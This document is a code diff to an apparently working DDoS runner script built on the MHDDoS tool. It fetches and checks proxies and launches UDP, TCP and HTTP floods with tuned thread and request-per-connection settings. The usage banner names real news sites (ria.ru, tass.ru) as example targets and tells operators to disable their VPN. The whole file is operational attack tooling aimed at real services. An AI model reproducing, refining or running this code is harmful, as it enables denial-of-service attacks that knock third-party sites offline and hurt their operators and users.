@@ -10,7 +10,14 @@ from concurrent.futures import ThreadPoolExecutor, as_completed
 
 import requests
 from MHDDoS.start import ProxyManager, logger
-from PyRoxy import ProxyChecker, ProxyType, Proxy
+from PyRoxy import ProxyType, Proxy
+
+
+PROXY_TIMEOUT = 5
+UDP_THREADS = 1
+
+HIGH_THREADS = 5000
+LOW_RPC = 1000
 
 
 class Targets:
@@ -60,7 +67,7 @@ def remove_duplicates(proxies):
     return [Proxy(*pargs) for pargs in set(proxy_tuples)]
 
 
-def update_proxies(period, proxy_timeout, targets):
+def update_proxies(period, targets, total_threads):
     #  Avoid parsing proxies too often when restart happens
     if os.path.exists('files/proxies/proxies.txt'):
         last_update = os.path.getmtime('files/proxies/proxies.txt')
@@ -73,33 +80,28 @@ def update_proxies(period, proxy_timeout, targets):
     Proxies = remove_duplicates(ProxyManager.DownloadFromConfig(config, 0))
     random.shuffle(Proxies)
 
-    CheckedProxies = []
     size = len(targets)
-    logger.info(f'{len(Proxies):,} Proxies are getting checked, this may take a while:')
+    logger.info(f'{len(Proxies):,} проксі перевіряється на працездатність - це може зайняти пару хвилин:')
 
-    futures = []
-    proxy_threads = min(
-        1000,
-        300 * multiprocessing.cpu_count(),
-    ) // size
-    with ThreadPoolExecutor(size) as executor:
+    future_to_proxy = {}
+    with ThreadPoolExecutor(min(1000, total_threads)) as executor:
         for target, chunk in zip(targets, (Proxies[i::size] for i in range(size))):
-            logger.info(f'{len(chunk):,} Proxies are getting checked against {target}')
-            futures.append(
-                executor.submit(
-                    ProxyChecker.checkAll,
-                    proxies=chunk,
-                    timeout=proxy_timeout,
-                    threads=proxy_threads,
-                    url=target
-                )
-            )
+            future_to_proxy.update({
+                executor.submit(proxy.check, target, PROXY_TIMEOUT): proxy
+                for proxy in chunk
+            })
 
-        for future in as_completed(futures):
-            CheckedProxies.extend(future.result())
+        CheckedProxies = [
+            future_to_proxy[future]
+            for future in as_completed(future_to_proxy) if future.result()
+        ]
 
     if not CheckedProxies:
-        logger.error("Proxy Check failed, Your network may be the problem | The target may not be available.")
+        logger.error(
+            'Не знайдено робочих проксі. '
+            'Переконайтеся що інтернет з`єднання стабільне і ціль доступна. '
+            'Перезапустіть Docker.'
+        )
         exit()
 
     os.makedirs('files/proxies/', exist_ok=True)
@@ -115,7 +117,7 @@ def update_proxies(period, proxy_timeout, targets):
                 socks5_wr.write(proxy_string)
 
 
-def run_ddos(targets, total_threads, period, rpc, udp_threads, http_methods, debug):
+def run_ddos(targets, total_threads, period, rpc, http_methods, debug):
     threads_per_target = total_threads // len(targets)
     params_list = []
     for target in targets:
@@ -123,17 +125,14 @@ def run_ddos(targets, total_threads, period, rpc, udp_threads, http_methods, deb
         if target.lower().startswith('udp://'):
             logger.warning(f'Make sure VPN is enabled - proxies are not supported for UDP targets: {target}')
             params_list.append([
-                'UDP', target[6:], str(udp_threads), str(period)
+                'UDP', target[6:], str(UDP_THREADS), str(period)
             ])
 
         # TCP
         elif target.lower().startswith('tcp://'):
-            for socks_type, socks_file, threads in (
-                ('4', 'socks4.txt', threads_per_target // 2),
-                ('5', 'socks5.txt', threads_per_target // 2),
-            ):
+            for socks_type, socks_file in (('4', 'socks4.txt'), ('5', 'socks5.txt')):
                 params_list.append([
-                    'TCP', target[6:], str(threads), str(period), socks_type, socks_file
+                    'TCP', target[6:], str(threads_per_target // 2), str(period), socks_type, socks_file
                 ])
 
         # HTTP(S)
@@ -155,7 +154,7 @@ def run_ddos(targets, total_threads, period, rpc, udp_threads, http_methods, deb
         p.wait()
 
 
-def start(total_threads, period, targets, rpc, udp_threads, http_methods, proxy_timeout, debug):
+def start(total_threads, period, targets, rpc, http_methods, debug):
     os.chdir('MHDDoS')
     while True:
         resolved = list(targets)
@@ -163,10 +162,22 @@ def start(total_threads, period, targets, rpc, udp_threads, http_methods, proxy_
             logger.error('Must provide either targets or a valid config file')
             exit()
 
+        if total_threads > HIGH_THREADS:
+            logger.warning(
+                f'Загальна кількість потоків перевищує {HIGH_THREADS}. '
+                f'Це може призвести до перевантаження системи та/або падіння продуктивності.'
+            )
+
+        if rpc < LOW_RPC:
+            logger.warning(
+                f'RPC менше за {LOW_RPC}. Це може призвести до падіння продуктивності '
+                f'через збільшення кількості перемикань кожного потоку між проксі.'
+            )
+
         no_proxies = all(target.lower().startswith('udp://') for target in resolved)
         if not no_proxies:
-            update_proxies(period, proxy_timeout, resolved)
-        run_ddos(resolved, total_threads, period, rpc, udp_threads, http_methods, debug)
+            update_proxies(period, resolved, total_threads)
+        run_ddos(resolved, total_threads, period, rpc, http_methods, debug)
 
 
 def init_argparse() -> argparse.ArgumentParser:
@@ -192,28 +203,14 @@ def init_argparse() -> argparse.ArgumentParser:
         '-p',
         '--period',
         type=int,
-        default=600,
-        help='How often to update the proxies (in seconds) (default is 600)',
-    )
-    parser.add_argument(
-        '--proxy-timeout',
-        metavar='TIMEOUT',
-        type=float,
-        default=3,
-        help='How many seconds to wait for the proxy to make a connection. '
-             'Higher values give more proxies, but with lower speed/quality. It also takes more time (default is 3)',
+        default=900,
+        help='How often to update the proxies (in seconds) (default is 900)',
     )
     parser.add_argument(
         '--rpc',
         type=int,
-        default=1000,
-        help='How many requests to send on a single proxy connection (default is 1000)',
-    )
-    parser.add_argument(
-        '--udp-threads',
-        type=int,
-        default=1,
-        help='Threads to run per UDP target (default is 1, change carefully)',
+        default=2000,
+        help='How many requests to send on a single proxy connection (default is 2000)',
     )
     parser.add_argument(
         '--debug',
@@ -246,10 +243,8 @@ def print_banner():
     python3 runner.py -t 500 https://ria.ru https://tass.ru
 - Інформація про хід атаки - прапорець `--debug`
     python3 runner.py --debug https://ria.ru https://tass.ru
-- Більше проксі (можливо, гіршої якості) - `--proxy-timeout SECONDS`
-    python3 runner.py --proxy-timeout 5 https://ria.ru https://tass.ru
-- Частота оновлення проксі (за замовчуванням - кожні 10 хвилин) - `-p SECONDS`
-    python3 runner.py -p 900 https://ria.ru https://tass.ru
+- Частота оновлення проксі (за замовчуванням - кожні 15 хвилин) - `-p SECONDS`
+    python3 runner.py -p 1200 https://ria.ru https://tass.ru
                           !!!ВИМКНІТЬ VPN!!!  (окрім UDP атак)
     ''')
 
@@ -262,8 +257,6 @@ if __name__ == '__main__':
         args.period,
         Targets(args.targets, args.config),
         args.rpc,
-        args.udp_threads,
         args.http_methods,
-        args.proxy_timeout,
         args.debug,
     )
